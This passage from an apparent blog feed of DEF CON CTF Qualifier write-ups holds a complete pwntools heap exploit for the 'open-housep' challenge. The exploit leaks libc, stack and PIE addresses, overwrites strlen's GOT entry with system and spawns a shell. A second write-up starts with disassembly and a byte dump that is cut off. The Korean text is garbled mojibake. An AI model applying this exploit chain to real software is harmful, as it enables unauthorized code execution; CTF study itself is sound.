binì˜ íŠ¹ì„±ì„ ì´ìš©í•´ì„œ êµ¬í•  ìˆ˜ ìžˆë‹¤. í•˜ì§€ë§Œ tcacheê°€ ì¡´ìž¬í•˜ê¸° ë•Œë¬¸ì— tcache binì´ ê°€ë“ ì°¨ê³  ë‚œ í›„, unsorted binì— ì²­í¬ê°€ ì €ìž¥ëœë‹¤.</li><li>8ê°œë¥¼ freeí•˜ê³ , 9ë²ˆì§¸ë¶€í„° unsorted binì— ì €ìž¥ëœë‹¤.</li><li>ì´ë•Œ ì²­í¬ì— libc ì£¼ì†Œê°€ ì í˜€ìžˆë‹¤. ì´ê²ƒì„ ë¦­í•˜ì˜€ë‹¤.</li><li>ì´ ë¸”ë¡œê·¸ë¥¼ ì°¸ê³ í•˜ì˜€ìŒ: <a href="https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin">https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin</a></li></ul><ol start="2"><li>libc.symbols[â€˜environâ€™]ì— ì €ìž¥ëœ stack address êµ¬í•˜ê¸°</li></ol><ul><li>pie base addressë¥¼ êµ¬í•˜ê¸° ìœ„í•´ stack addressë¥¼ êµ¬í–ˆë‹¤.</li></ul><ol start="3"><li>pie base address êµ¬í•˜ê¸°</li></ol><ul><li>stackì—ëŠ” ë†’ì€ í™•ë¥ ë¡œ pie addressê°€ ì¡´ìž¬í•œë‹¤.</li></ul><ol start="4"><li>e.got[â€˜strlenâ€™]ì„ system í•¨ìˆ˜ë¡œ ë®ìŒ</li></ol><ul><li>create() í•¨ìˆ˜ì—ì„œ strlen(ìž…ë ¥) í˜•íƒœë¡œ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— strlenì„ system í•¨ìˆ˜ë¡œ ë®ê³  ìž…ë ¥ìœ¼ë¡œ â€˜&#x2F;bin&#x2F;shâ€™ë¥¼ ë³´ëƒˆë‹¤.</li></ul><br><br><ol><li>Getting libc address</li></ol><ul><li>If 0x10~0x400 is initially allocated, it goes into tcache bin instead of fastbin or unsorted bin.</li><li>It can be caculated by using the characteristics of unsorted bins. But because tcache exists, tcache bin is full and then chunks are stored in unsorted bin.</li><li>8 are freed, and from the 9th are stored in the unsorted bin.</li><li>At this time, the libc address is written in the chunk. I leaked this.</li><li>Referred to this blog(Korean): <a href="https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin">https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin</a></li></ul><ol start="2"><li>Getting the stack address stored in libc.symbols[â€˜environâ€™]</li></ol><ul><li>The stack address was leaked to get the pie base address.</li></ul><ol start="3"><li>Getting the pie base address</li></ol><ul><li>There is a pie address in the stack with a high probability.</li></ul><ol start="4"><li>Overwriting e.got[â€˜strlenâ€™] with the system function</li></ol><ul><li>Since strlen(input) is used in the create() function, strlen is overwritten by the system function and â€˜&#x2F;bin&#x2F;shâ€™ is sent as an input.</li></ul><p><br><br></p><p>ì¤‘ê°„ ì¤‘ê°„ leakí•˜ë©´ì„œ í”„ë¡œê·¸ëž¨ì´ ìžê¾¸ ì¢…ë£Œë˜ì—ˆë‹¤. ê·¸ëž˜ì„œ ì•„ëž˜ payloadë¥¼ ì´ìš©í•˜ì—¬ next í¬ì¸í„°ë¥¼ ì •ìƒì ìœ¼ë¡œ ë§Œë“¤ì–´ì£¼ê³  ë‹¤ìŒ leakì„ ì§„í–‰í•˜ì˜€ë‹¤.</p><p>The program exit after leak. So, by using the payload below, I made next pointer normally and proceeded with the next leak.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br></pre></td></tr></table></figure><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./open-housep&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./open-housep&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib32/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;review!&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;v&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x200</span>-<span class="number">1</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaab&#x27;</span>)</span><br><span class="line">heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x2860</span></span><br><span class="line">info(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete(1) # í•œ ë²ˆë§Œ í•˜ë©´ tcacheë¡œ ë“¤ì–´ê°; ã… ã… </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">create(<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x20</span>) <span class="comment"># for next chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0x1010</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BBBB\n\n**** - &#x27;</span>)</span><br><span class="line">libc_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc.address = libc_leak - <span class="number">0x2257f8</span></span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### ì›ëž˜ëŒ€ë¡œ ë°”ê¿” ì¤€ ë‹¤ìŒ(create ì•ˆë˜ì–´ì„œ), environ ì¶œë ¥í•´ì„œ ìŠ¤íƒ ì£¼ì†Œ ë¦­</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;environ&#x27;</span>] ) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BBBB\n\n**** - &#x27;</span>)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">### ì›ëž˜ëŒ€ë¡œ ë°”ê¿” ì¤€ ë‹¤ìŒ(create ì•ˆë˜ì–´ì„œ), ìŠ¤íƒì— ì €ìž¥ëœ íŒŒì´ ì£¼ì†Œ ë¦­</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(stack_leak + <span class="number">0xc0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">view()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BBBB\n\n**** - &#x27;</span>)</span><br><span class="line">pie_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">&#x27;pie leak :: &#x27;</span> + <span class="built_in">hex</span>(pie_leak))</span><br><span class="line"></span><br><span class="line">e.address = pie_leak - <span class="number">0x34</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### ì›ëž˜ëŒ€ë¡œ ë°”ê¿” ì¤€ ë‹¤ìŒ</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">payload += p32(heap_base + <span class="number">0xbf0</span>) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">5</span>, payload)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;eeeeeeee&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;ffffffff&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;gggggggg&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;hhhhhhhh&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;iiiiiiii&#x27;</span>) <span class="comment"># 11</span></span><br><span class="line">create(<span class="string">b&#x27;jjjjjjjj&#x27;</span>) <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;O&#x27;</span> * (<span class="number">0x200</span>-<span class="number">1</span>) + <span class="string">b&#x27;O&#x27;</span></span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;strlen&#x27;</span>]) <span class="comment"># next</span></span><br><span class="line">payload += p32(<span class="number">0x42424242</span>) <span class="comment"># prev</span></span><br><span class="line">modify(<span class="number">11</span>, payload)</span><br><span class="line">modify(<span class="number">12</span>, p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">create(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Defcon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)</title>
      <link href="/230601-defcon2023-test-your-luck/"/>
      <url>/230601-defcon2023-test-your-luck/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li></ul><blockquote><p>Can you beat the hottest new skill-based game sweeping the nation? Is guessing 32 bits really possible within the span of the CTF?</p></blockquote><ul><li>[30 solves]</li></ul><p>very fun challenge XD</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDAë¡œ ë´¤ì„ ë•Œë³´ë‹¤ ë” ë§Žì€ ë¡œì§ì´ ìžˆëŠ” ê²ƒ ê°™ì•˜ë‹¤. ê·¸ëž˜ì„œ ë‚˜ëŠ” ì£¼ë¡œ GDBë¥¼ ì´ìš©í•˜ì—¬ ë¶„ì„í–ˆë‹¤. IDAì—ì„œ ì•”í˜¸í™”ëœ í•¨ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜ ìžˆì—ˆë‹¤.</p><p>It seems to have a bit more logic than the function seen with IDA. So I usually analyzed with GDB. I could find encrypted function in IDA.</p><img src="/images/230601-defcon2023-test-your-luck/1.png" width=550/><br><p>ìœ„ í•¨ìˆ˜ê°€ ë™ì  ë””ë²„ê¹…í•  ë•ŒëŠ” ìž˜ í•´ì„ì´ ë˜ì–´ì„œ ë°”ì´íŠ¸ë¥¼ ì¶”ì¶œí•´ì„œ íŒ¨ì¹˜ë¥¼ í•´ì£¼ê¸°ë¡œ í•˜ì˜€ë‹¤.</p><p>The above function was interpreted well during dynamic debugging, so I decided to extract the bytes and patch them.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20i 0x555555556000</span><br><span class="line">   0x555555556000:      endbr64</span><br><span class="line">   0x555555556004:      push   r12</span><br><span class="line">   0x555555556006:      xor    r9d,r9d</span><br><span class="line">   0x555555556009:      xor    r8d,r8d</span><br><span class="line">   0x55555555600c:      mov    ecx,0x8</span><br><span class="line">   0x555555556011:      push   rbp</span><br><span class="line">   0x555555556012:      mov    esi,0x1</span><br><span class="line">   0x555555556017:      mov    edi,0x1</span><br><span class="line">   0x55555555601c:      push   rbx</span><br><span class="line">   0x55555555601d:      sub    rsp,0x20</span><br><span class="line">   0x555555556021:      mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555602a:      mov    QWORD PTR [rsp+0x18],rax</span><br><span class="line">   0x55555555602f:      lea    rax,[rip+0xffffffffffffdfca]        # 0x555555554000</span><br><span class="line">   0x555555556036:      lea    rdx,[rsp+0x8]</span><br><span class="line">   0x55555555603b:      lea    rbp,[rsp+0x10]</span><br><span class="line">   0x555555556040:      mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x555555556045:      call   0x5555555552e9 &lt;syscall&gt;</span><br><span class="line">   0x55555555604a:      lea    r12,[rip+0x22ef]        # 0x555555558340</span><br><span class="line">   0x555555556051:      jmp    0x5555555560a9</span><br><span class="line">   0x555555556053:      nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">...</span><br><span class="line">   0x555555556145:      sub    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555614e:      jne    0x555555556159</span><br><span class="line">   0x555555556150:      add    rsp,0x20</span><br><span class="line">   0x555555556154:      pop    rbx</span><br><span class="line">   0x555555556155:      pop    rbp</span><br><span class="line">   0x555555556156:      pop    r12</span><br><span class="line">   0x555555556158:      ret</span><br><span class="line">   0x555555556159:      call   0x555555555030 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x55555555615e:      add    BYTE PTR [rax],al</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p/x 0x55555555615e - 0x555555556000</span><br><span class="line">$3 = 0x15e</span><br><span class="line">gef&gt; print-format --length 0x15e --bitlen 8 --lang py 0x555555556000</span><br><span class="line">buf = [0xf3, 0xf, ... ]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">buf = [<span class="number">0xf3</span>, <span class="number">0xf</span>, <span class="number">0x1e</span>, <span class="number">0xfa</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x5</span>, <span class="number">0xca</span>, <span class="number">0xdf</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0xe8</span>, <span class="number">0x9f</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x4c</span>, <span class="number">0x8d</span>, <span class="number">0x25</span>, <span class="number">0xef</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xeb</span>, <span class="number">0x56</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xe3</span>, <span class="number">0x72</span>, <span class="number">0xd</span>, <span class="number">0x48</span>, <span class="number">0x3b</span>, <span class="number">0x1d</span>, <span class="number">0x12</span>, <span class="number">0x25</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x86</span>, <span class="number">0x9c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x84</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x4c</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7e</span>, <span class="number">0x4f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x3</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x20</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7f</span>, <span class="number">0x8b</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x3</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xe9</span>, <span class="number">0x6d</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xe0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xeb</span>, <span class="number">0x96</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xc0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x85</span>, <span class="number">0x46</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x66</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x84</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span 